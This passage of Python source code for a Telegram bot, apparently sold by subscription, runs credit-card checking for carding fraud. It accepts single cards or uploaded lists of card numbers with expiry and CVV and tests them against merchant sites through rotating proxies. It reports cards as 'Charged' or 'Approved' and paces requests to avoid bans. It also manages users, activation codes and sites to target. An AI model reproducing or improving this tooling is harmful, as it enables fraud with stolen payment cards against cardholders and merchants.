        bot.reply_to(message, f"❌ Proxy not found: <code>{proxy_to_remove}</code>", parse_mode='HTML')
        return
    new_proxies = [p for p in current_proxies if p != proxy_to_remove]
    save_user_proxies(user_id, new_proxies)
    bot.reply_to(message, f"✅ <b>Proxy Removed!</b>\n\n<code>{proxy_to_remove}</code>", parse_mode='HTML')

@bot.message_handler(commands=['clearproxy'])
def clearproxy_command(message):
    user_id = message.from_user.id
    if is_user_blocked(user_id) and not is_admin(user_id):
        bot.reply_to(message, "🚫 <b>You have been banned from this bot.</b>", parse_mode='HTML')
        return
    current_proxies = load_user_proxies(user_id)
    count = len(current_proxies)
    if count == 0:
        bot.reply_to(message, "❌ No proxies to clear.")
        return
    save_user_proxies(user_id, [])
    bot.reply_to(message, f"✅ <b>Cleared all {count} proxies!</b>", parse_mode='HTML')

@bot.message_handler(commands=['proxy'])
def proxy_check_command(message):
    user_id = message.from_user.id
    if is_user_blocked(user_id) and not is_admin(user_id):
        bot.reply_to(message, "🚫 <b>You have been banned from this bot.</b>", parse_mode='HTML')
        return
    proxies = load_user_proxies(user_id)
    if not proxies:
        bot.reply_to(message, "❌ No proxies to check.")
        return
    msg = bot.reply_to(message, f"🔥 Checking {len(proxies)} proxies...", parse_mode='HTML')
    results = []
    for proxy in proxies:
        result = test_proxy_direct(proxy)
        results.append(result)
        time.sleep(0.3)
    alive_proxies = [r['proxy'] for r in results if r['status'] == 'alive']
    dead_proxies = [r['proxy'] for r in results if r['status'] == 'dead']
    dead_reasons = [f"• {r['proxy'][:30]}... -> {r['reason']}" for r in results if r['status'] == 'dead']
    reasons_text = "\n".join(dead_reasons[:10]) if dead_reasons else "None"
    if len(dead_reasons) > 10:
        reasons_text += f"\n... and {len(dead_reasons) - 10} more"
    bot.edit_message_text(
        f"🔥 Checking proxies...\n\n<b>Checked:</b> {len(alive_proxies) + len(dead_proxies)}/{len(proxies)}\n<b>Alive:</b> {len(alive_proxies)}\n<b>Dead:</b> {len(dead_proxies)}\n\n<b>Recent failures:</b>\n<code>{reasons_text}</code>",
        chat_id=message.chat.id,
        message_id=msg.message_id,
        parse_mode='HTML'
    )
    save_user_proxies(user_id, alive_proxies)
    summary = f"""✅ <b>Proxy Check Complete!</b>

<b>Total Proxies:</b> {len(proxies)}
<b>Alive:</b> {len(alive_proxies)}
<b>Removed:</b> {len(dead_proxies)}

Your proxies have been updated with only working proxies."""
    bot.edit_message_text(summary, chat_id=message.chat.id, message_id=msg.message_id, parse_mode='HTML')

@bot.message_handler(commands=['getproxy'])
def getproxy_command(message):
    user_id = message.from_user.id
    if is_user_blocked(user_id) and not is_admin(user_id):
        bot.reply_to(message, "🚫 <b>You have been banned from this bot.</b>", parse_mode='HTML')
        return
    proxies = load_user_proxies(user_id)
    if not proxies:
        bot.reply_to(message, "❌ No proxies found.")
        return
    if len(proxies) <= 50:
        proxy_list = "\n".join([f"{i+1}. <code>{p}</code>" for i, p in enumerate(proxies)])
        bot.reply_to(message, f"<b>📋 All Proxies ({len(proxies)}):</b>\n\n{proxy_list}", parse_mode='HTML')
    else:
        filename = f"proxies_{user_id}_{int(time.time())}.txt"
        with open(filename, 'w') as f:
            for i, proxy in enumerate(proxies):
                f.write(f"{i+1}. {proxy}\n")
        with open(filename, 'rb') as f:
            bot.send_document(user_id, f, caption=f"<b>📋 All Proxies ({len(proxies)}):</b>", parse_mode='HTML')
        os.remove(filename)

@bot.message_handler(commands=['mcancel'])
def mcancel_command(message):
    user_id = message.from_user.id
    if user_id in active_scans and active_scans.get(user_id, {}).get("active", False):
        active_scans[user_id]['stop_requested'] = True
        bot.reply_to(message, "✅ <b>Mass check cancelled!</b>", parse_mode='HTML')
    else:
        bot.reply_to(message, "❌ No mass check in progress", parse_mode='HTML')

@bot.message_handler(commands=['cc'])
def single_cc_check(message):
    user_id = message.from_user.id
    if is_user_blocked(user_id) and not is_admin(user_id):
        bot.reply_to(message, "🚫 <b>You have been banned from this bot.</b>", parse_mode='HTML')
        return
    sites = load_admin_sites()
    proxies = load_user_proxies(user_id)
    if not sites:
        bot.reply_to(message, "❌ No sites available. Contact admin to add sites.")
        return
    if not proxies:
        bot.reply_to(message, "❌ No proxies available. Add proxies using /addproxy")
        return
    try:
        cc_input = message.text.split(' ', 1)[1].strip()
    except:
        bot.reply_to(message, "❌ Invalid format. Use: `/cc 4242424242424242|12|25|123`")
        return
    pattern = r'(\d{15,16})\|(\d{2})\|(\d{2,4})\|(\d{3,4})'
    match = re.search(pattern, cc_input)
    if not match:
        bot.reply_to(message, "❌ Invalid CC format. Use: <code>/cc card|mm|yy|cvv</code>", parse_mode='HTML')
        return
    card = f"{match.group(1)}|{match.group(2)}|{match.group(3)}|{match.group(4)}"
    msg = bot.reply_to(message, f"<b>⚡ Checking...</b>\n\n💳 Card: <code>{card}</code>", parse_mode='HTML')
    try:
        result = check_card_with_retry(card, sites, proxies, max_retries=3)
        if not is_admin(user_id):
            increment_user_checks(user_id, 1)
        brand, bin_type, level, bank, country, flag = get_bin_info(card.split('|')[0])
        if result['status'] == 'Charged':
            status_emoji = "💎"
            status_text = "CHARGED"
            send_hit_message(user_id, result, 'Charged')
        elif result['status'] == 'Approved':
            status_emoji = "✅"
            status_text = "APPROVED"
            send_hit_message(user_id, result, 'Approved')
        else:
            status_emoji = "❌"
            status_text = "DECLINED"
        checks_left_display = get_user_checks_left(user_id) if not is_admin(user_id) else "♾️"
        final_resp = f"""<b>━━━━━━━━━━━━━━━━━</b>
<b>💠 Results</b>
<blockquote>{status_emoji} Status: {status_text}</blockquote>
<blockquote>💳 Card: <code>{result['card']}</code></blockquote>
<blockquote>📝 Response: {result['message'][:150]}</blockquote>
<blockquote>🌐 Gateway: 🔥 {result.get('gateway', 'Unknown')} | 💰 {result.get('price', '-')}</blockquote>
<b>💠 BIN Info</b>
<pre>BIN Info: {brand} - {bin_type} - {level}
Bank: {bank}
Country: {country} {flag}</pre>
<b>💳 Checks left: {checks_left_display}</b>"""
        bot.edit_message_text(final_resp, chat_id=message.chat.id, message_id=msg.message_id, parse_mode='HTML')
    except Exception as e:
        bot.edit_message_text(f"❌ Error checking card: {e}", chat_id=message.chat.id, message_id=msg.message_id)

# ==================== فحص جماعي (كومبو) - النسخة المعدلة ====================
@bot.message_handler(commands=['chk'])
def mass_check_command(message):
    user_id = message.from_user.id
    if is_user_blocked(user_id) and not is_admin(user_id):
        bot.reply_to(message, "🚫 <b>You have been banned from this bot.</b>", parse_mode='HTML')
        return
    
    # التحقق من وجود فحص نشط
    if user_id in active_scans and active_scans.get(user_id, {}).get("active", False):
        bot.reply_to(message, "⏳ <b>You already have a check in progress. Wait until it completes.</b>", parse_mode='HTML')
        return
    
    # طلب الملف
    bot.reply_to(message, "📁 <b>Please send the .txt file containing cards.</b>\n\nFormat: <code>card|MM|YYYY|CVV</code> (one per line)\n\nSend /cancel to cancel.", parse_mode='HTML')
    bot.register_next_step_handler(message, process_mass_file, user_id)

def process_mass_file(message, user_id):
    if message.text and message.text.lower() == '/cancel':
        bot.reply_to(message, "❌ Operation cancelled.")
        return
    
    if not message.document:
        bot.reply_to(message, "❌ Please send a .txt file.")
        return
    
    if not message.document.file_name.endswith('.txt'):
        bot.reply_to(message, "❌ Please send a .txt file.")
        return
    
    try:
        file_info = bot.get_file(message.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        content = downloaded_file.decode('utf-8')
        cards = extract_cc(content)
        
        if not cards:
            bot.reply_to(message, "❌ No valid cards found in file.")
            return
        
        sites = load_admin_sites()
        proxies = load_user_proxies(user_id)
        
        if not sites:
            bot.reply_to(message, "❌ No sites available. Contact admin to add sites.")
            return
        if not proxies:
            bot.reply_to(message, "❌ No proxies available. Add proxies first.")
            return
        
        # التحقق من عدد الفحوصات للمستخدم العادي
        if not is_admin(user_id):
            checks_left = get_user_checks_left(user_id)
            if len(cards) > checks_left:
                bot.reply_to(message, f"⚠️ File contains {len(cards)} cards but you have {checks_left} checks left.\n\nChecking first {checks_left} cards.", parse_mode='HTML')
                cards = cards[:checks_left]
        
        max_cards = 10000 if is_admin(user_id) else 5000
        if len(cards) > max_cards:
            bot.reply_to(message, f"⚠️ File contains {len(cards)} cards. Limiting to first {max_cards} cards.", parse_mode='HTML')
            cards = cards[:max_cards]
        
        # حفظ البيانات مؤقتاً وطلب اختيار الوضع
        user_pending_mass[user_id] = {
            'cards': cards,
            'sites': sites,
            'proxies': proxies,
            'total': len(cards)
        }
        
        bot.send_message(user_id, "📋 <b>Select mode:</b>\n\n• CHARGES ONLY: Only send charged cards\n• ALL HITS: Send charged + approved cards", reply_markup=get_mode_keyboard(), parse_mode='HTML')
        
    except Exception as e:
        bot.reply_to(message, f"❌ Error processing file: {e}")

@bot.callback_query_handler(func=lambda call: call.data in ['mode_charges', 'mode_all', 'mode_cancel'])
def handle_mode_selection(call):
    user_id = call.from_user.id
    
    if call.data == 'mode_cancel':
        if user_id in user_pending_mass:
            del user_pending_mass[user_id]
        bot.edit_message_text("❌ Mass check cancelled.", chat_id=call.message.chat.id, message_id=call.message.message_id)
        bot.answer_callback_query(call.id)
        return
    
    if user_id not in user_pending_mass:
        bot.answer_callback_query(call.id, "⚠️ Session expired. Please use /chk again.")
        bot.edit_message_text("❌ Session expired. Please use /chk again.", chat_id=call.message.chat.id, message_id=call.message.message_id)
        return
    
    mode = "charges_only" if call.data == 'mode_charges' else "all_hits"
    pending = user_pending_mass.pop(user_id)
    cards = pending['cards']
    sites = pending['sites']
    proxies = pending['proxies']
    total_cards = pending['total']
    
    # رسالة بداية الفحص
    msg = bot.edit_message_text(f"🔄 Starting check for {total_cards} cards...\nMode: {'CHARGES ONLY' if mode == 'charges_only' else 'ALL HITS'}", chat_id=call.message.chat.id, message_id=call.message.message_id, parse_mode='HTML')
    bot.answer_callback_query(call.id)
    
    # بدء الفحص في thread منفصل
    thread = threading.Thread(target=run_mass_check, args=(user_id, cards, sites, proxies, mode, msg.message_id))
    thread.start()

def run_mass_check(user_id, cards, sites, proxies, mode, message_id):
    active_scans[user_id] = {"active": True, "stop_requested": False}
    
    all_results = {
        'charged': [],
        'approved': [],
        'dead': [],
        'total': len(cards),
        'checked': 0,
        'start_time': time.time()
    }
    
    card_responses = []
    
    for i, card in enumerate(cards):
        # التحقق من طلب الإيقاف
        if not active_scans.get(user_id, {}).get("active", False) or active_scans.get(user_id, {}).get("stop_requested", False):
            bot.edit_message_text("🛑 <b>Mass check stopped by user.</b>", chat_id=user_id, message_id=message_id, parse_mode='HTML')
            break
        
        # فحص البطاقة
        res = check_card_with_retry(card, sites, proxies, max_retries=1)
        all_results['checked'] += 1
        
        # تحديث عدد الفحوصات للمستخدم العادي
        if not is_admin(user_id):
            increment_user_checks(user_id, 1)
        
        # تخزين النتيجة
        card_responses.append({
            'card': card,
            'status': res['status'],
            'message': res['message'],
            'price': res.get('price', '-'),
            'gateway': res.get('gateway', 'Unknown')
        })
        
        # إرسال Hit حسب الوضع
        if res['status'] == 'Charged':
            all_results['charged'].append(res)
            send_hit_message(user_id, res, 'Charged')
        elif res['status'] == 'Approved' and mode == "all_hits":
            all_results['approved'].append(res)
            send_hit_message(user_id, res, 'Approved')
        elif res['status'] == 'Approved':
            all_results['approved'].append(res)
        else:
            all_results['dead'].append(res)
        
        # تحديث واجهة التقدم
        elapsed = int(time.time() - all_results['start_time'])
        hours = elapsed // 3600
        minutes = (elapsed % 3600) // 60
        seconds = elapsed % 60
        
        gateway = all_results['charged'][0]['gateway'] if all_results['charged'] else (all_results['approved'][0]['gateway'] if all_results['approved'] else 'Unknown')
        
        # عرض آخر 5 نتائج
        recent_responses = ""
        for cr in card_responses[-5:]:
            if cr['status'] == 'Charged':
                emoji = "💎"
            elif cr['status'] == 'Approved':
                emoji = "✅"
            else:
                emoji = "❌"
            short_card = cr['card'][:10] + "***" + cr['card'][-4:] if len(cr['card']) > 15 else cr['card']
            recent_responses += f"{emoji} {short_card} | {cr['message'][:40]}\n"
        
        progress_text = f"""
<b>💠 Progress</b>
<blockquote>💳 Total: {all_results['total']} | 💎 Charged: {len(all_results['charged'])} | ✅ Approved: {len(all_results['approved'])} | ❌ Dead: {len(all_results['dead'])}</blockquote>
<blockquote>📊 Checked: {all_results['checked']}/{all_results['total']}</blockquote>
<blockquote>🌐 Gateway: 🔥 {gateway}</blockquote>
<blockquote>⏱️ Time: {hours}h {minutes}m {seconds}s</blockquote>
<b>━━━━━━━━━━━━━━━━━</b>
<b>📝 Recent Results:</b>
<code>{recent_responses}</code>
<b>━━━━━━━━━━━━━━━━━</b>
"""
        try:
            bot.edit_message_text(progress_text, chat_id=user_id, message_id=message_id, parse_mode='HTML')
        except:
            pass
        
        # تأخير بين الفحوصات لتجنب الحظر
        time.sleep(random.uniform(0.8, 1.2))
    
    # إرسال النتائج النهائية
    elapsed = int(time.time() - all_results['start_time'])
    hours = elapsed // 3600
    minutes = (elapsed % 3600) // 60
    seconds = elapsed % 60
    
    hits_text = ""
    if all_results['charged']:
        for r in all_results['charged'][:10]:
            hits_text += f"💎 <code>{r['card']}</code> | {r.get('price', '-')}\n"
    if all_results['approved'] and mode == "all_hits":
        for r in all_results['approved'][:10]:
            hits_text += f"✅ <code>{r['card']}</code> | {r.get('price', '-')}\n"
    if not hits_text:
        hits_text = "No hits found"
    
    gateway = all_results['charged'][0]['gateway'] if all_results['charged'] else (all_results['approved'][0]['gateway'] if all_results['approved'] else 'Unknown')
    checks_left_display = get_user_checks_left(user_id) if not is_admin(user_id) else "♾️"
    
    summary = f"""<b>━━━━━━━━━━━━━━━━━</b>
<b>⚡ Final Results</b>
<blockquote>💳 Total: {all_results['total']} | 💎 Charged: {len(all_results['charged'])} | ✅ Approved: {len(all_results['approved'])} | ❌ Dead: {len(all_results['dead'])}</blockquote>
<blockquote>🌐 Gateway: 🔥 {gateway}</blockquote>
<blockquote>⏱️ Time: {hours}h {minutes}m {seconds}s</blockquote>
<b>━━━━━━━━━━━━━━━━━</b>
<b>💠 Hits</b>
<blockquote>{hits_text}</blockquote>
<b>━━━━━━━━━━━━━━━━━</b>
<b>💳 Checks left: {checks_left_display}</b>"""
    
    bot.edit_message_text(summary, chat_id=user_id, message_id=message_id, parse_mode='HTML')
    
    # تنظيف الفحص النشط
    if user_id in active_scans:
        del active_scans[user_id]

# ==================== أوامر الأدمن ====================
@bot.message_handler(commands=['admin'])
def admin_panel(message):
    user_id = message.from_user.id
    if not is_admin(user_id):
        bot.reply_to(message, "❌ <b>Only admin can use this command.</b>", parse_mode='HTML')
        return
    stats_text = """<b>👑 Admin Control Panel</b>

Use buttons below or direct commands:

├ <code>/gencode number</code> - Generate activation code
├ <code>/block user_id</code> - Block user
├ <code>/unblock user_id</code> - Unblock user
├ <code>/broadcast message</code> - Broadcast message
├ <code>/setlimit user_id number</code> - Set user limit
├ <code>/users</code> - List all users
├ <code>/user user_id</code> - Show user details
└ <code>/stats</code> - Bot statistics"""
    bot.reply_to(message, stats_text, reply_markup=get_admin_menu_keyboard(), parse_mode='HTML')

@bot.message_handler(commands=['gencode'])
def gencode_command(message):
    user_id = message.from_user.id
    if not is_admin(user_id):
        bot.reply_to(message, "❌ <b>Only admin can use this command.</b>", parse_mode='HTML')
        return
    try:
        parts = message.text.split()
        checks_limit = int(parts[1]) if len(parts) > 1 else DEFAULT_CHECK_LIMIT
    except:
        bot.reply_to(message, "❌ Invalid number. Use: /gencode 5000")
        return
    code = create_activation_code(checks_limit)
    bot.reply_to(message, f"✅ <b>Code Generated!</b>\n\nCode: <code>{code}</code>\nChecks: {checks_limit}\n\nUser can use: /redeem {code}", parse_mode='HTML')

@bot.message_handler(commands=['block'])
def block_command(message):
    user_id = message.from_user.id
    if not is_admin(user_id):
        bot.reply_to(message, "❌ <b>Only admin can use this command.</b>", parse_mode='HTML')
        return
    try:
        target_id = int(message.text.split()[1])
        block_user(target_id)
        bot.reply_to(message, f"✅ <b>User {target_id} has been blocked!</b>", parse_mode='HTML')
    except:
        bot.reply_to(message, "❌ Usage: /block user_id")

@bot.message_handler(commands=['unblock'])
def unblock_command(message):
    user_id = message.from_user.id
    if not is_admin(user_id):
        bot.reply_to(message, "❌ <b>Only admin can use this command.</b>", parse_mode='HTML')
        return
    try:
        target_id = int(message.text.split()[1])
        unblock_user(target_id)
        bot.reply_to(message, f"✅ <b>User {target_id} has been unblocked!</b>", parse_mode='HTML')
    except:
        bot.reply_to(message, "❌ Usage: /unblock user_id")

@bot.message_handler(commands=['broadcast'])
def broadcast_command(message):
    user_id = message.from_user.id
    if not is_admin(user_id):
        bot.reply_to(message, "❌ <b>Only admin can use this command.</b>", parse_mode='HTML')
        return
    text = message.text.replace("/broadcast", "").strip()
    if not text:
        bot.reply_to(message, "❌ Usage: /broadcast message")
        return
    users = get_all_users()
    sent = 0
    failed = 0
    bot.reply_to(message, f"🔄 Broadcasting to {len(users)} users...")
    for uid in users.keys():
        try:
            bot.send_message(int(uid), f"📢 <b>Broadcast from Admin</b>\n\n{text}", parse_mode='HTML')
            sent += 1
            time.sleep(0.2)
        except:
            failed += 1
    bot.send_message(admin, f"✅ <b>Broadcast Complete!</b>\n✅ Sent: {sent}\n❌ Failed: {failed}", parse_mode='HTML')

@bot.message_handler(commands=['setlimit'])
def setlimit_command(message):
    user_id = message.from_user.id
    if not is_admin(user_id):
        bot.reply_to(message, "❌ <b>Only admin can use this command.</b>", parse_mode='HTML')
        return
    try:
        parts = message.text.split()
        target_id = int(parts[1])
        new_limit = int(parts[2])
        users = load_users()
        target_id_str = str(target_id)
        if target_id_str not in users:
            users[target_id_str] = {}
        users[target_id_str]['check_limit'] = new_limit
        users[target_id_str]['premium'] = True
        save_users(users)
        bot.reply_to(message, f"✅ <b>User {target_id} limit updated!</b>\nNew limit: {new_limit} checks", parse_mode='HTML')
    except:
        bot.reply_to(message, "❌ Usage: /setlimit user_id number")

@bot.message_handler(commands=['users'])
def users_command(message):
    user_id = message.from_user.id
    if not is_admin(user_id):
        bot.reply_to(message, "❌ <b>Only admin can use this command.</b>", parse_mode='HTML')
        return
    users = get_all_users()
    if not users:
        bot.reply_to(message, "📋 No users found.")
        return
    text = "<b>📋 Users List:</b>\n\n"
    for uid, data in users.items():
        username = data.get('username', 'Unknown')
        premium = "👑" if is_admin(int(uid)) else ("⭐" if data.get('premium', False) else "🆓")
        blocked = "🚫" if data.get('blocked', False) else "✅"
        total = data.get('total_checks', 0)
        text += f"<code>{uid}</code> | {username} | {premium} | {blocked} | {total} checks\n"
        if len(text) > 3500:
            filename = f"users_{int(time.time())}.txt"
            with open(filename, 'w') as f:
                f.write(text)
            with open(filename, 'rb') as f:
                bot.send_document(user_id, f)
            os.remove(filename)
            text = ""
    if text:
        bot.reply_to(message, text, parse_mode='HTML')

@bot.message_handler(commands=['user'])
def user_command(message):
    user_id = message.from_user.id
    if not is_admin(user_id):
        bot.reply_to(message, "❌ <b>Only admin can use this command.</b>", parse_mode='HTML')
        return
    try:
        target_id = int(message.text.split()[1])
        users = load_users()
        user_data = users.get(str(target_id), {})
        if not user_data:
            bot.reply_to(message, f"❌ User {target_id} not found.")
            return
        is_target_admin = is_admin(target_id)
        text = f"""<b>👤 User Data: {target_id}</b>

├ 📝 Username: @{user_data.get('username', 'Unknown')}
├ ⭐ Status: {'👑 ADMIN' if is_target_admin else '✅ PREMIUM' if user_data.get('premium', False) else '❌ FREE'}
├ 🚫 Blocked: {'Yes' if user_data.get('blocked', False) else 'No'}
├ 📊 Total Checks: {user_data.get('total_checks', 0)}
├ 💎 Successful Hits: {user_data.get('successful_checks', 0)}
├ 💳 Check Limit: {user_data.get('check_limit', 0) if not is_target_admin else 'UNLIMITED'}
├ 💰 Checks Left: {max(0, user_data.get('check_limit', 0) - user_data.get('total_checks', 0)) if not is_target_admin else '♾️'}
└ 📅 Registered: {user_data.get('registered_at', 'Unknown')[:10]}"""
        bot.reply_to(message, text, parse_mode='HTML')
    except:
        bot.reply_to(message, "❌ Usage: /user user_id")

@bot.message_handler(commands=['stats'])
def stats_command(message):
    user_id = message.from_user.id
    if not is_admin(user_id):
        bot.reply_to(message, "❌ <b>Only admin can use this command.</b>", parse_mode='HTML')
        return
    users = get_all_users()
    total_users = len(users)
    premium_users = len([u for u in users.values() if u.get('premium', False)])
    admin_count = len(ADMIN_IDS)
    blocked_users = len([u for u in users.values() if u.get('blocked', False)])
    total_checks = sum(u.get('total_checks', 0) for u in users.values())
    total_codes = len(load_codes())
    text = f"""<b>📊 Bot Statistics</b>

├ 👥 Total Users: {total_users}
├ 👑 Admins: {admin_count}
├ ⭐ Premium Users: {premium_users}
├ 🚫 Blocked Users: {blocked_users}
├ 📈 Total Checks: {total_checks}
├ 🎫 Total Codes: {total_codes}
└ ⏱️ Last Update: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"""
    bot.reply_to(message, text, parse_mode='HTML')

@bot.message_handler(commands=['subscribe'])
def subscribe_command(message):
    user_id = message.from_user.id
    if is_user_blocked(user_id) and not is_admin(user_id):
        bot.reply_to(message, "🚫 <b>You have been banned from this bot.</b>", parse_mode='HTML')
        return
    text = """⭐ <b>SONIC SUBSCRIPTION</b>

Choose your plan:

├ 1 Hour - 30⭐
├ 12 Hours - 50⭐
├ 1 Day - 100⭐
├ 3 Days - 250⭐
└ 1 Week - 500⭐

Click on a plan below to pay with Telegram Stars.

After payment, your subscription will be activated automatically."""
    bot.reply_to(message, text, reply_markup=get_subscription_keyboard(), parse_mode='HTML')

@bot.message_handler(commands=['redeem'])
def redeem_command(message):
    user_id = message.from_user.id
    if is_user_blocked(user_id) and not is_admin(user_id):
        bot.reply_to(message, "🚫 <b>You have been banned from this bot.</b>", parse_mode='HTML')
        return
    if is_admin(user_id):
        bot.reply_to(message, "👑 <b>You are admin, no need to redeem!</b>", parse_mode='HTML')
        return
    try:
        code = message.text.split(' ', 1)[1].strip().upper()
    except:
        bot.reply_to(message, "❌ Usage: /redeem CODE")
        return
    success, msg = activate_code(user_id, code)
    if success:
        bot.reply_to(message, f"✅ <b>Subscription Activated!</b>\n\n{msg}", parse_mode='HTML')
    else:
        bot.reply_to(message, f"❌ <b>Activation Failed!</b>\n\n{msg}", parse_mode='HTML')

# ==================== أوامر إدارة المواقع للأدمن ====================
@bot.message_handler(commands=['mysites'])
def mysites_command(message):
    user_id = message.from_user.id
    if not is_admin(user_id):
        bot.reply_to(message, "❌ <b>Only admin can use this command.</b>", parse_mode='HTML')
        return
    sites = load_admin_sites()
    if not sites:
        bot.reply_to(message, "📋 <b>No sites found.</b>\n\nUse /addsites or /site to add sites.", parse_mode='HTML')
        return
    sites_text = "\n".join([f"• {site}" for site in sites])
    bot.reply_to(message, f"📋 <b>Sites ({len(sites)}):</b>\n\n{sites_text}", parse_mode='HTML')

@bot.message_handler(commands=['site'])
def add_site_command(message):
    user_id = message.from_user.id
    if not is_admin(user_id):
        bot.reply_to(message, "❌ <b>Only admin can use this command.</b>", parse_mode='HTML')
        return
    try:
        site = message.text.split(' ', 1)[1].strip()
        site = site.replace('https://', '').replace('http://', '').rstrip('/')
    except:
        bot.reply_to(message, "❌ Usage: /site domain.com")
        return
    proxies = load_user_proxies(user_id)
    if not proxies:
        bot.reply_to(message, "❌ No proxies available to test site.")
        return
    msg = bot.reply_to(message, f"🔄 Testing site: {site}...", parse_mode='HTML')
    proxy = random.choice(proxies)
    result = test_site(site, proxy)
    if result['status'] == 'alive':
        current_sites = load_admin_sites()
        if site not in current_sites:
            new_sites = current_sites + [site]
            save_admin_sites(new_sites)
            bot.edit_message_text(f"✅ <b>Site added successfully!</b>\n\n{site}", chat_id=message.chat.id, message_id=msg.message_id, parse_mode='HTML')
        else:
            bot.edit_message_text(f"⚠️ <b>Site already exists:</b> {site}", chat_id=message.chat.id, message_id=msg.message_id, parse_mode='HTML')
    else:
        bot.edit_message_text(f"❌ <b>Could not add site!</b>\n\nSite appears to be dead or unreachable.", chat_id=message.chat.id, message_id=msg.message_id, parse_mode='HTML')

@bot.message_handler(commands=['rmsite'])
def rmsite_command(message):
    user_id = message.from_user.id
    if not is_admin(user_id):
        bot.reply_to(message, "❌ <b>Only admin can use this command.</b>", parse_mode='HTML')
        return
    try:
        site = message.text.split(' ', 1)[1].strip()
    except:
        bot.reply_to(message, "❌ Usage: /rmsite domain.com")
        return
    current_sites = load_admin_sites()
    if site not in current_sites:
        bot.reply_to(message, f"❌ Site not found: {site}")
        return
    new_sites = [s for s in current_sites if s != site]
    save_admin_sites(new_sites)
    bot.reply_to(message, f"✅ <b>Site removed successfully!</b>\n\n{site}", parse_mode='HTML')

@bot.message_handler(commands=['clearsites'])
def clearsites_command(message):
    user_id = message.from_user.id
    if not is_admin(user_id):
        bot.reply_to(message, "❌ <b>Only admin can use this command.</b>", parse_mode='HTML')
        return
    count = len(load_admin_sites())
    if count == 0:
        bot.reply_to(message, "❌ No sites to clear.")
        return
    save_admin_sites([])
    bot.reply_to(message, f"✅ <b>Cleared all {count} sites!</b>", parse_mode='HTML')

@bot.message_handler(commands=['sitecheck'])
def sitecheck_command(message):
    user_id = message.from_user.id
    if not is_admin(user_id):
        bot.reply_to(message, "❌ <b>Only admin can use this command.</b>", parse_mode='HTML')
        return
    sites = load_admin_sites()
    if not sites:
        bot.reply_to(message, "❌ No sites to check.")
        return
    proxies = load_user_proxies(user_id)
    if not proxies:
        bot.reply_to(message, "❌ No proxies available.")
        return
    user_pending_sites[user_id] = {
        'action': 'check',
        'sites': sites,
        'expires': time.time() + 300
    }
    bot.reply_to(message, "💰 <b>Select price range to filter sites:</b>\n\nSites with cheapest product above selected range will be removed.", reply_markup=get_price_filter_keyboard(), parse_mode='HTML')

@bot.message_handler(commands=['addsites'], content_types=['document'])
def addsites_file_command(message):
    user_id = message.from_user.id
    if not is_admin(user_id):
        bot.reply_to(message, "❌ <b>Only admin can use this command.</b>", parse_mode='HTML')
        return
    if not message.document or not message.document.file_name.endswith('.txt'):
        bot.reply_to(message, "❌ Reply to a .txt file containing sites.")
        return
    file_info = bot.get_file(message.document.file_id)
    downloaded_file = bot.download_file(file_info.file_path)
    content = downloaded_file.decode('utf-8')
    sites = [line.strip() for line in content.split('\n') if line.strip()]
    sites = [s.replace('https://', '').replace('http://', '').rstrip('/') for s in sites]
    if not sites:
        bot.reply_to(message, "❌ No valid sites found in file.")
        return
    user_pending_sites[user_id] = {
        'action': 'add',
        'sites': sites,
        'expires': time.time() + 300
    }
    bot.reply_to(message, f"💰 <b>Select price range to filter sites:</b>\n\n{len(sites)} sites found.\nSites with cheapest product above selected range will be removed.\n\nYou have 5 minutes to select.", reply_markup=get_price_filter_keyboard(), parse_mode='HTML')

# ==================== معالجة أزرار الكولباك ====================
@bot.callback_query_handler(func=lambda call: True)
def handle_callback(call):
    user_id = call.from_user.id
    data = call.data
    
    if data == "show_commands":
        help_text = """<b>📋 BASIC COMMANDS</b>
├ <code>/start</code> - Show main menu
├ <code>/help</code> - Show help
├ <code>/profile</code> - View your profile
├ <code>/myproxy</code> - View your proxies

<b>🔌 PROXY MANAGEMENT</b>
├ <code>/proxy</code> - Check all proxies & remove dead
├ <code>/addproxy</code> - Add proxies (one per line)
├ <code>/addproxies</code> - Upload .txt file with proxies
├ <code>/chkproxy proxy</code> - Check single proxy
├ <code>/rmproxy proxy</code> - Remove single proxy
├ <code>/clearproxy</code> - Remove all proxies
├ <code>/getproxy</code> - Get all proxies

<b>💳 CARD CHECKING</b>
├ <code>/cc card|mm|yy|cvv</code> - Check single card
├ <code>/chk</code> - Mass check (reply to .txt file)
└ <code>/mcancel</code> - Cancel mass check

<b>⭐ SUBSCRIPTION</b>
├ <code>/subscribe</code> - Buy subscription with stars
└ <code>/redeem code</code> - Redeem activation code

<b>📝 FORMATS</b>
├ CC: <code>card|mm|yyyy|cvv</code>
└ Proxy: <code>ip:port</code> or <code>ip:port:user:pass</code>"""
        if is_admin(user_id):
            help_text += """

<b>👑 ADMIN COMMANDS</b>
├ <code>/admin</code> - Admin panel
├ <code>/site domain</code> - Add site
├ <code>/rmsite url</code> - Remove site
├ <code>/sitecheck</code> - Check all sites
├ <code>/addsites</code> - Upload sites file
├ <code>/clearsites</code> - Clear all sites
├ <code>/mysites</code> - View all sites
├ <code>/gencode number</code> - Generate code
├ <code>/block user_id</code> - Block user
├ <code>/unblock user_id</code> - Unblock user
├ <code>/broadcast message</code> - Broadcast message
├ <code>/setlimit user_id number</code> - Set user limit
├ <code>/users</code> - List all users
├ <code>/user user_id</code> - User details
└ <code>/stats</code> - Bot statistics"""
        bot.edit_message_text(help_text, chat_id=call.message.chat.id, message_id=call.message.message_id, reply_markup=get_commands_keyboard(), parse_mode='HTML')
        bot.answer_callback_query(call.id)
    
    elif data == "main_menu":
        username = call.from_user.username or f"user_{user_id}"
        stats_text = get_user_stats_text(user_id, username)
        bot.edit_message_text(stats_text, chat_id=call.message.chat.id, message_id=call.message.message_id, reply_markup=get_main_menu_keyboard(), parse_mode='HTML')
        bot.answer_callback_query(call.id)
    
    elif data == "show_subscription":
        text = """⭐ <b>SONIC SUBSCRIPTION</b>

Choose your plan:

├ 1 Hour - 30⭐
├ 12 Hours - 50⭐
├ 1 Day - 100⭐
├ 3 Days - 250⭐
└ 1 Week - 500⭐

Click on a plan below to pay with Telegram Stars.

After payment, your subscription will be activated automatically."""
        bot.edit_message_text(text, chat_id=call.message.chat.id, message_id=call.message.message_id, reply_markup=get_subscription_keyboard(), parse_mode='HTML')
        bot.answer_callback_query(call.id)
    
    elif data.startswith("sub_"):
        plan_key = data.split("_")[1]
        plan = STAR_PRICES.get(plan_key)
        if plan:
            title = f"Subscription - {plan['name']}"
            description = f"Subscribe for {plan['name']}\nDuration: {plan['name']}\nPrice: {plan['stars']} stars"
